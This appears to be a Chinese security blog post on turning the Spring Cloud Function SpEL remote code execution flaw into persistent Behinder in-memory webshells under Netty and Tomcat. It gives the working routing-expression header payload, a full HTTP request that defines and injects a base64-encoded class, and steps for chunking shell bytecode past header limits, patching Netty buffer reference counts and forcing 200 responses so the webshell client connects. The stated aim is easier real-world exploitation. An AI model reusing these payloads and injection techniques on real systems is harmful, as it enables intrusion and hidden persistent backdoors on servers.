#  Netty和Tomcat环境下给Spring Cloud Function Spel RCE注入冰蝎内存马   
 黑伞安全   2023-04-25 18:34  
  
在Spring Cloud Function SpEL RCE细节公布后，分析的文章很多，这里不再对漏洞进行分析，一直以来的习惯就是对漏洞进行包装，Java中能RCE的漏洞尽量都注入冰蝎/哥斯拉/蚁剑内存马，而不是满足于简单的回显或一句话内存马，这样做的好处是大家在实战利用的过程中更加方便，提升效率。这篇文章记录了漏洞包装的过程中克服的一些难点——无session情况下的冰蝎连接及Netty下通过Header头获取POST的body内容。  
  
  
文章可分为三部分：  
  
  
1.漏洞复现  
  
2.Spring Cloud Function在Netty下如何注入冰蝎内存马  
  
3.Spring Cloud Function在Tomcat下如何注入冰蝎内存马  
  
  
改版后的冰蝎已经上传至GitHub：  
  
https://github.com/shuimuLiu/Behinder-Base65  
  
  
  
**0****1**  
  
**影响版本**  
  
  
  
3 <= Version <= 3.2.2（commit dc5128b之前）  
  
  
  
**0****2**  
  
**漏洞复现**  
  
  
  
**漏洞环境：**  
  
https://github.com/spring-cloud/spring-cloud-function/releases/tag/v3.2.0  
  
  
**漏洞触发的URL**  
：/functionRouter  
  
  
**Header头加数据**  
：spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8h4LtZFwYlluJV5SQFgKAicoBWd3GYb4zAIgzkMwbwVE6ibGRzTOXMlQGA/640?wx_fmt=png "")  
  
  
弹出计算器  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hojEYDNasnuduDj9WTBY83pFv8hFlssT4WSwZ8agvO5sNKWoIp08Lhg/640?wx_fmt=png "")  
  
  
  
**0****3**  
  
**Netty内存马适配**  
  
  
  
01  
  
单命令回显内存马  
  
  
  
这个漏洞适配内存马的不同点是payload在header头中触发的，照抄c0ny1师傅的payload如下：  
  
  
{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}  
  
  
当直接把这个payload放入到header头的时候，由于header头过大导致报错  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hLyTpDDibxelTS4cp7h3tqQnFYpXMlflafXX07fa9sMEuibxhtTElaB7Q/640?wx_fmt=png "")  
  
  
通过报错信息看到header的大小不能超过8192字节  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hN5fqFZBeTp4pXrpoQYSI25hCPbE1Ja6nX0X2zYHppfpGHX5G3KaiaNw/640?wx_fmt=png "")  
  
  
通过和众多师傅交流，对变量名做出缩短（这是最简单的一种，但是我还没有实现4ra1n师傅的方法，从asm等角度缩小payload），Demo如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hxgyPibdGvftQxFquN3RkDuosx0gjY3dLH4gDXbJIkWeibkMV4aOXkHKA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hicvKhY2icZVdH5EMBOKuYJGelDCGMY4wmhkVHuMESlykTNkA6a2euR0w/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hCFRicfaTPVz2J8jhyDS9LrD9RHwIwISNUCJnYISs5CslqNFYsmymwqw/640?wx_fmt=png "")  
  
  
base64编码后的大小  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hPo2J99EhsrKk1rC2JjZgttM6EjBibUYdyjicYbGnOIJpjpx8NmAYWHCg/640?wx_fmt=png "")  
  
  
发送注册netty handler的数据包  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hQWEIjxIkOYymfQu8sCT376b6cK0nIDVp7RmJlx3jZYV7ibI8mbnaPXw/640?wx_fmt=png "")  
  
  
数据包如下：  
  
POST /functionRouter HTTP/1.1  
  
Host: 127.0.0.1:8080  
  
Accept: */*  
  
spring.cloud.function.routing-expression: {T(org.springframework.cglib.core.ReflectUtils).defineClass('m',T(org.springframework.util.Base64Utils).decodeFromString('xxx'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}  
  
Content-Type: application/x-www-form-urlencoded  
  
Content-Length: 0  
  
  
执行命令  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hYvgZrBHVZmLNRBm55l3bWXRLMZuWhDXW72duWBjSbtZ2mp0aMXyiaOQ/640?wx_fmt=png "")  
  
  
02  
  
冰蝎内存马  
  
  
  
虽然function的netty一句话内存马已经有了，打起来还是冰蝎方便些，因为Header头不能过大，所以这里选择的方案是通过线程获取到post的body，然后对body中的class进行反射调用，通过Java-Object-Searcher工具这里找到了内存中存储body的信息位置-io.netty.handler.codec.http.DefaultLastHttpContent  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hMuhrQNk1FuibCQtP0qLfE9sHXWj2r7xQD9qbBEibQlcDTZ7yfvQwZHhg/640?wx_fmt=png "")  
  
  
实现的Demo如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8h2o27XqMBMTrFvKs8vCnMPY1zI1PGFef19BC4GbRE2pdP8ZGoDFemXg/640?wx_fmt=png "")  
  
  
在找到了存储body位置的信息之后，发现这里只能保存不超过8192字节的数据，那么这里想出的解决方案，是把将要在类中运行的字节码base64编码之后保存在三个类中，这个时候需要发送三次数据包，然后，最后一个数据包将前三个类中保存的base64字符串解码，注入到内存中  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hVaeH0IVYicyOROcfTWibM1N7VfHibrou3WcFqdhMk7yFoVgUdwvlEBibYw/640?wx_fmt=png "")  
  
  
当然，这只是我的思路，实现起来还是要考虑程序具体的执行情况，主要是下面的三个问题  
  
  
**第一个问题**  
  
  
字符串发送到服务端后，服务端接收的字节大小是没有问题的，问题是无法读取字节信息，即DefaultLastHttpContent的readBytes方法出现了问题，随即debug跟进，实际上这里的readBytes是调用父类AbstractByteBuf的方法，接着跟进checkReadableBytes  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hsicQtyIvFcGS2V93EIpCUkIAYALP7pQIHbXektyXCxqGjDuhtQ0oibuw/640?wx_fmt=png "")  
  
  
跟进checkReadableBytes方法到AbstractByteBuf.checkReadableBytes0方法  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hc88uayOJJjIdFLibCP9Galniao34GU0icbsT5FNYOumoNvSw9Ricpc8AUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
这里调用ensureAccessible方法对是否可以读取字节内容进行了校验  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8h08WvD84Wp8licWV2Lp4bQHvzDN2fTl8aoBHdyTrZ7oXufja84dCgzTQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
跟进isAccessible方法  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hZDvMedr1v7uC8qcTo7mPnMxQyziagCiaZ3db15A3hwEDRyHENtaibPuHQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
这里如果refCnt的值为1，那么会无法读取到字节  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hdud3yj6GRK3VueeeHuKKRGBTrDoE8ghicicQGjPPSMmE105pbwf3BWGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
异常信息如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hX3arLnykVfCibibG4OlOXjtcp3fBykIJqFZuuzYzVvgwBUFoc7o3BV5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
那么反射把它的值改为2，这样就不会返回异常信息，Demo如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hMgWjQh8umIfF76QAaZ2RwEHzGIv3KtoMGZn8icpgSOXw0cC7wgxicFaA/640?wx_fmt=png "")  
  
  
**第二个问题**  
  
  
在完成了第一校验之后，发现还是无法读取到字节信息，于是接着跟进，在修改了一次RefCnt的值之后checkReadableBytes方法通过了校验  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hzK3CJFKGCib7vrmlXOMRmMpA8d9FYbicppxCAIlnd7vKKjnJA0Majo3g/640?wx_fmt=png "")  
  
  
那么问题应该是出在了getBytes方法这里  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hOKhwQxn6hHIhhs5RpOwLl9jbc35ItQ9NlfnXRTeyrA03uIdGlU8jtg/640?wx_fmt=png "")  
  
  
跟进checkIndex0方法，发现这个方法中没有出现异常  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hIvM8eUGibZg6zp6PicsUkPS1SHxuoXlSraZk6KFTXZicBhMe1rUB0tjJQ/640?wx_fmt=png "")  
  
  
于是跟进this.unwrap().getBytes方法  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8haGavIp37vu9XicvNu6ibLtbjS0uCbEXTU1Z1xG7sWjicnNyGeN5fHoWmQ/640?wx_fmt=png "")  
  
  
终于在UnsafeByteBufUtil类的getBytes方法这里找到了校验方法（ensureAccessible）的调用  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8h77LevFMgbxvviblSrPxicgxVmQiaNv6n1AkcG43iammlpczDWSox60KoEA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hwXW5lJyE4e5HuIhh1XMEwySBAdVtdpTHWJziccXWvB0Uco92yicYWtGQ/640?wx_fmt=png "")  
  
  
现在需要确定的点就是RefCnt在第二次校验的时候值是多少，发现其值为1  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hpKauh99cfoRzCQoA4yhZuS83jbjS8w8pFdvhTC4J2I7qFPRiaicic7pxg/640?wx_fmt=png "")  
  
  
那么还是解决第一个问题的方法，修改refCnt的值，这里需要注意的第二次refCnt所属的对象类为PooledUnsafeDirectByteBuf，第一次refCnt所属的对象类为PooledSlicedByteBuf，而第二次refCnt所属的对象存储在第一次refCnt所属的对象类的rootParent变量中  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hJxoXsGjuGGyPGe8cmzLtuicrMluhp2UY0YBkJOqK682uGnKDgMzeZ4A/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hDIsb4b2uhDSKicPgrMxX9JeCQSaOQicN4Wn2uoUENibPMeXR4ZDT8sz3A/640?wx_fmt=png "")  
  
  
所以此时的思路就是先获取到rootParent变量所存储的对象，然后修改refCnt的值，修改之后就可以读取到字节信息了，整体实现的Demo如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hkYVZTf4lM8v7CQdQ12gCLibiag4de4SIHBUkxWN97cTEDnoFhRHzBnSw/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hdULHLNlcAtFaTDZwYg0Jyv4iaibic28SRdzOhvRp0uriaXQwrghrlibYLnw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hTfFhvNXiagUdVTHpWqSzwwrqP2BVHgQ4B0qicv5xDVDRWdwxUD9oCplw/640?wx_fmt=png "")  
  
  
冰蝎马的实现Demo如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hBbeLYia51lN1iaoOhicMIBdrofw4IaeYMJGjmuBdRSaoGQQ4eUAvWhXww/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hFW6VnBTNsGdMGhH7KgR9ceZRVrBkXZB7KpCdGwRfr9QWFXfHNUnLJQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hIm0ticKuEJPS9PvDk6SXlqoqltDpia7hiaKCleSJ1yzzglGyNZEAgnBRQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hsA4qiafwG2sfNUj5aRD1g08w5fMQ097HvkbUaeQmnia6j5XtSics4ukNQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hWr83pnHrLbxpJSIphYaGLicNT3bC72LIYjqrBvLuwdykoeUh1iboC9Yg/640?wx_fmt=png "")  
  
  
实现存储内存马的分段类Demo如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hzf7cA1EsfCelGHgVQZZZic8ZFr8fMOq5HXNo3ib1H2fxqV7cpDJX0hzQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hGfiamqm3tGpaicsrzl5evlOzJ25dYXRxBZjVRGoibibHiacvE90WoMwef1g/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hUstAtZKEDvsE8sPWLwJMNicqeDTicgt2m0lhaFfjIgGc3GFayoI6L5EA/640?wx_fmt=png "")  
  
  
整合冰蝎马内存信息的类Demo如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hrbV8fONQDttT3cYegoZfGSv1JudpPYqic1ibDPiaWbyPHdTCrgjWiaA2ZQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hk48LwGyt7bXgWe1wX0xtBtEThSp9nMBWGAMJYAHX3WfmxlGS2al5ew/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8h9Ja13shDqv7W95J8gULibB1xTW9zZbibtZppO1JQh9hrozCnXo8X5L9A/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hschkXcougOnDb9GsfAJ4bZ5JSEkzMGhxcqOiaSqtNhGic1oYoqSWFzfA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8h9ZIPWL2ibJQf65IPNUdbpj5rp6yNJGWq7jDebqSxdqmicI60cibW01f3Q/640?wx_fmt=png "")  
  
  
**第三个问题**  
  
  
冰蝎连接时候不成功，执行单命令回显却成功？  
  
  
在使用上述方法注入冰蝎马之后并不成功，注入单命令回显的内存马却成功  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hJwulHEpHVYGAtoI1vZHzgOJibP8cr3yb7DH6CXDEg6IkahT5N6G8mxA/640?wx_fmt=png "")  
  
  
经过对比发现  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8h6DzwnMpcsWIS5OCbTMGEDWdxm2YoXkrU0iaZ3uFyK0Ey3fhZBb9EIyg/640?wx_fmt=png "")  
  
  
是Content-Type的原因，如果使用application/x-www-form-urlencoded方式，冰蝎马是可以连接的  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8h87D6tBp3cc4iauETSQkTMe8QKQuXZL1wiaMPEgObibMeFcUgPoqkUGq6w/640?wx_fmt=png "")  
  
  
  
**0****4**  
  
**Tomcat下Spring内存马的注入**  
  
  
  
Netty在国内使用是否普遍不确定，但是在Tomcat下Spring是真的多  
  
  
**1**  
  
request如何获取body中的内容  
  
  
gateway的不用多说，对于function的内存马，主要是header头大小问题，思路是通过header头中的代码获取body，经过和众多师傅交流，发现如果是在Tomcat下起的Spring环境（这也是国内的现状），那么可以通过T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getRequest().getParameter("a")可以获取到POST body中的a参数内容  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8h115aypLX2qPibiaURvcQwBWFicgDaPSyobWtM5IloSvqOgHLZYqBVs0PA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
**2**  
  
冰蝎内存马****  
  
  
对于内存马的注入这里我们可以考虑注入spring的Interceptor内存马，因为之前LandGrey师傅已经提出过Demo这里直接使用就好了  
  
  
首先是Interceptor的Demo，源代码如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hagSNdJCl6BOlE70wDg3DuKZKJLSJv6kJLo3uYwBxhpg4Cy4FcVL2cw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8haupp5ibhFsibqpVK15ym7X643hiczxA18ZQ5icYya3cGxmZusM96Yj4www/640?wx_fmt=png "")  
  
  
注入Interceptor的代码如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hrzxcleGYIgL5ZnCtRUr2icbkLAgZGXfv1LPPLibeicjZh7CwDmxn87HzA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hgNXR4IA8tbWu7OssaxW2nDDyTsBY5Xt91WxV6j6CYtCspy3qq3lcicw/640?wx_fmt=png "")  
  
  
在实际利用该内存马的时候发现，冰蝎客户端如果收到的状态码是404的话，就不会接收解密，为了不改动客户端，直接在注入内存马的时候将服务端每次response的响应码改为200  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hRFh48VcBaLgHylxoRcYaUp1HSRzMibB8s1jDJ0J8S49VsRkObo2t9Mg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
function发送数据包  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hTic8YxdDCzT87c7kYmwWKibcbpyT9zVATYfvlb0BibvxAzR5ZBT5IvF1w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
冰蝎连接：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRr8sSAgxuSBqkwaSiaNuG8hCeleQQ2TekUaQBiaGt41nSYC0IkRYHTyc9BCKnBe3kvsnlzGJeNUh1g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
